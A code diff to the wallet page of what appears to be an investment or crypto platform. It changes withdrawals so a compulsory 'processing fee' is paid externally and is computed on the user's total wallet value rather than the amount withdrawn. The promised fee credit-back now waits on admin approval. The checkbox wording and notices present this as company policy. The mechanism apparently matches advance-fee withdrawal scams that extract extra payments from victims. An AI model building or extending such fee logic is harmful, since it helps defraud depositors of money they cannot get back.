@@ -10,6 +10,7 @@ import { listBanks, removeBank, onBanksChanged, type BankAccount } from '../lib/
 import { depositInstructions, onDepositInstructionsChanged, isAdmin } from '../lib/depositInstructions'
 import type { Web3Payout } from '../lib/depositInstructions'
 import { userWallets, USER_WALLETS_EVENT } from '../lib/userWallets'
+import { feeProofs } from '../lib/feeProofs'
 import { getProfile } from '../lib/userProfile'
 import { useWeb3 } from '../hooks/use-web3'
 import { cryptoIconFor, assetIconFor } from '../lib/cryptoIcon'
@@ -428,10 +429,16 @@ export default function WalletPage() {
     // withdrawn amount to USD using the live quote so the same
     // `max($500, 0.8%)` floor applies uniformly.
     const grossUsd = selectedCurrency === 'USD' ? gross : gross * getUsdRate(selectedCurrency)
+    // Fee is calculated against MAX(this withdrawal, total wallet value)
+    // so users can't game it by splitting one large withdrawal into many
+    // small ones — the company-rule fee is compulsory based on overall
+    // account size.
+    const totalWalletUsd = portfolioStore.getWalletValueUsd()
+    const feeBaseUsd = Math.max(grossUsd, totalWalletUsd)
     const deliverySurcharge = selectedCurrency === 'USD' && (usdWithdrawMethod === 'cashiers_check' || usdWithdrawMethod === 'check')
       ? (checkInfo.delivery === 'overnight' ? 25 : checkInfo.delivery === 'priority' ? 10 : 0)
       : 0
-    const { feeUsd: processingFeeUsd } = calcProcessingFee(grossUsd)
+    const { feeUsd: processingFeeUsd } = calcProcessingFee(feeBaseUsd)
     const totalFeeUsd = processingFeeUsd + deliverySurcharge
 
     let reference = selectedCurrency === 'USD' ? 'Bank Transfer (ACH)' : `Crypto Withdrawal (${selectedCurrency})`
@@ -534,22 +541,27 @@ export default function WalletPage() {
     const signed = -pendingWithdrawal.amountAbs
     portfolioStore.addTransaction('withdraw', signed, pendingWithdrawal.currency, reference, newIdempotencyKey())
 
-    // Compulsory fee credit-back: the externally paid fee is added to the
-    // user's USD balance so the account is never empty for the next
-    // investment (company rule). Recorded as a separate deposit transaction
-    // so it shows clearly in history and audit.
-    portfolioStore.addTransaction(
-      'deposit',
-      pendingWithdrawal.feeUsd,
-      'USD',
-      `Account-activation fee credit (paid externally via ${feePayCurrency} — ${proof.slice(0, 16)}${proof.length > 16 ? '…' : ''})`,
-      newIdempotencyKey(),
-    )
+    // Queue the fee proof for ADMIN verification. The fee credit-back to
+    // the user's wallet only happens after an admin clicks "Mark fee paid"
+    // — users cannot self-confirm. This prevents fake proofs from
+    // inflating balances.
+    const profile = getProfile()
+    if (profile?.email) {
+      feeProofs.add({
+        userEmail: profile.email,
+        amount: pendingWithdrawal.amountAbs,
+        currency: pendingWithdrawal.currency,
+        feeUsd: pendingWithdrawal.feeUsd,
+        feePayCurrency,
+        feeProof: proof,
+        reference: pendingWithdrawal.reference,
+      })
+    }
 
     const grossLabel = pendingWithdrawal.currency === 'USD'
       ? fmt(pendingWithdrawal.amountAbs)
       : `${pendingWithdrawal.amountAbs.toLocaleString(undefined, { maximumFractionDigits: 8 })} ${pendingWithdrawal.currency}`
-    let successMessage = `${pendingWithdrawal.methodLabel} for ${grossLabel} submitted. Fee ${fmt(pendingWithdrawal.feeUsd)} (proof attached) will be credited back to your wallet balance — pending admin verification.`
+    let successMessage = `${pendingWithdrawal.methodLabel} for ${grossLabel} submitted. Fee proof ${fmt(pendingWithdrawal.feeUsd)} queued for admin review — the fee will be credited back to your wallet only after the admin marks it paid.`
     if (pendingWithdrawal.etaNote) successMessage += ` ${pendingWithdrawal.etaNote}`
 
     setTransferStatus({ kind: 'success', title: 'Withdrawal queued', message: successMessage })
@@ -1529,12 +1541,15 @@ export default function WalletPage() {
                 {(() => {
                   const amt = parseFloat(amount) || 0
                   const grossUsd = selectedCurrency === 'USD' ? amt : amt * getUsdRate(selectedCurrency)
+                  const totalWalletUsd = portfolioStore.getWalletValueUsd()
+                  const feeBase = Math.max(grossUsd, totalWalletUsd)
                   const deliverySurcharge = selectedCurrency === 'USD' && (usdWithdrawMethod === 'cashiers_check' || usdWithdrawMethod === 'check')
                     ? (checkInfo.delivery === 'overnight' ? 25 : checkInfo.delivery === 'priority' ? 10 : 0)
                     : 0
-                  const { feeUsd: processingFee, ratePct, tierLabel } = calcProcessingFee(grossUsd)
+                  const { feeUsd: processingFee, ratePct, tierLabel } = calcProcessingFee(feeBase)
                   const totalFee = processingFee + deliverySurcharge
                   const fmt = (n: number) => `$${n.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
+                  const partialNote = amt > 0 && grossUsd < totalWalletUsd
                   return (
                     <div className="border-t border-[#ffffff08] pt-3 space-y-2">
                       <div className="flex items-center justify-between">
@@ -1551,11 +1566,16 @@ export default function WalletPage() {
                         <span className="text-sm text-[#A0A0A0]">Total fee (paid externally)</span>
                         <span className="text-sm font-medium text-[#E5E5E5]">{amt > 0 ? fmt(totalFee) : '—'}</span>
                       </div>
+                      {partialNote && (
+                        <p className="text-[11px] text-[#A0A0A0] mt-1">
+                          Fee is computed against your <span className="text-[#E5E5E5]">total wallet value</span> ({fmt(totalWalletUsd)}), not just this withdrawal — partial withdrawals don't reduce the company-rule fee.
+                        </p>
+                      )}
                       <p className="text-[11px] text-[#F57C00] mt-1">
                         ⚠ Sliding-scale fee (0.8% – 2.0% by amount, company rules). Paid externally — NOT deducted from your wallet balance.
                       </p>
                       <p className="text-[11px] text-[#0C8B44] mt-1">
-                        ✓ The fee you pay is credited back to your wallet balance once verified, so the account stays funded for your next investment.
+                        ✓ The fee you pay is credited back to your wallet balance <span className="text-[#E5E5E5]">only after an admin marks it paid</span> — not automatically.
                       </p>
                     </div>
                   )
@@ -1885,7 +1905,7 @@ export default function WalletPage() {
                     className="mt-0.5 w-4 h-4 accent-[#0C8B44] cursor-pointer"
                   />
                   <span className="text-[11px] text-[#A0A0A0] leading-relaxed">
-                    <span className="text-[#E5E5E5] font-medium">Required:</span> I understand the {fmt(usdAmount)} processing fee is paid externally (not from my balance) and will be credited back to my wallet so the account remains funded for the next investment. I confirm this is a compulsory company policy.
+                    <span className="text-[#E5E5E5] font-medium">Required:</span> I understand the {fmt(usdAmount)} processing fee is paid externally (not from my balance) and will be credited back to my wallet ONLY after an admin verifies my payment. I confirm this is a compulsory company policy.
                   </span>
                 </label>
 
